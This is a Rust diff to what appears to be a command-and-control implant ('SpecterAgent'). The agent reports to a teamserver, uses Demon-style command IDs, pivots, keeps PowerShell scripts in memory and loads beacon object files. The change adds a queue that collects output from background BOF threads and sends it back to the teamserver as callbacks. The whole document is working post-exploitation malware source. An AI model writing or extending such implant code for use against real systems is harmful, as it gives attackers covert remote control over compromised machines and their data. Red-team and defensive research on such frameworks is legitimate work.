@@ -10,8 +10,9 @@ use tracing::{info, warn};
 use std::collections::HashMap;
 use std::time::{SystemTime, UNIX_EPOCH};
 
+use crate::coffeeldr::{self, BofOutputQueue};
 use crate::config::SpecterConfig;
-use crate::dispatch::{self, DispatchResult, MemFileStore, PsScriptStore};
+use crate::dispatch::{self, DispatchResult, MemFileStore, PsScriptStore, Response};
 use crate::download::DownloadTracker;
 use crate::error::SpecterError;
 use crate::job::JobStore;
@@ -48,6 +49,8 @@ pub struct SpecterAgent {
     pivot_state: PivotState,
     /// Job store for tracking background BOF threads and processes.
     job_store: JobStore,
+    /// Shared queue for callbacks produced by background BOF threads.
+    bof_output_queue: BofOutputQueue,
     /// In-memory PowerShell script store for `CommandPsImport`.
     ps_scripts: PsScriptStore,
 }
@@ -86,6 +89,7 @@ impl SpecterAgent {
             socket_state: SocketState::new(),
             pivot_state: PivotState::new(),
             job_store: JobStore::new(),
+            bof_output_queue: coffeeldr::new_bof_output_queue(),
             ps_scripts: PsScriptStore::new(),
         })
     }
@@ -275,6 +279,7 @@ impl SpecterAgent {
                     &mut self.mem_files,
                     &mut self.job_store,
                     &mut self.ps_scripts,
+                    &self.bof_output_queue,
                 );
                 if self.handle_dispatch_result(package.request_id, result).await {
                     // Exit requested — terminate.
@@ -342,6 +347,22 @@ impl SpecterAgent {
                     );
                 }
             }
+
+            // Drain callbacks queued by background BOF threads and send them
+            // to the teamserver as CommandInlineExecute responses.
+            let bof_responses = self.drain_bof_output();
+            for resp in bof_responses {
+                if let Err(e) =
+                    self.send_callback_raw(resp.command_id, resp.request_id, &resp.payload).await
+                {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        command_id = resp.command_id,
+                        error = %e,
+                        "failed to send threaded BOF callback"
+                    );
+                }
+            }
         }
     }
 
@@ -387,6 +408,27 @@ impl SpecterAgent {
                 false
             }
         }
+    }
+
+    /// Drain pending BOF callbacks from background threads, converting each
+    /// [`coffeeldr::BofCallback`] into a [`Response`] with the
+    /// `CommandInlineExecute` command ID.
+    fn drain_bof_output(&self) -> Vec<Response> {
+        let callbacks = match self.bof_output_queue.lock() {
+            Ok(mut q) => std::mem::take(&mut *q),
+            Err(poisoned) => std::mem::take(&mut *poisoned.into_inner()),
+        };
+
+        let cmd_id = u32::from(DemonCommand::CommandInlineExecute);
+        callbacks
+            .into_iter()
+            .map(|cb| {
+                let mut payload = Vec::with_capacity(4 + cb.payload.len());
+                payload.extend_from_slice(&cb.callback_type.to_le_bytes());
+                payload.extend_from_slice(&cb.payload);
+                Response { command_id: cmd_id, request_id: 0, payload }
+            })
+            .collect()
     }
 
     /// Compute the sleep delay in milliseconds, applying jitter if configured.
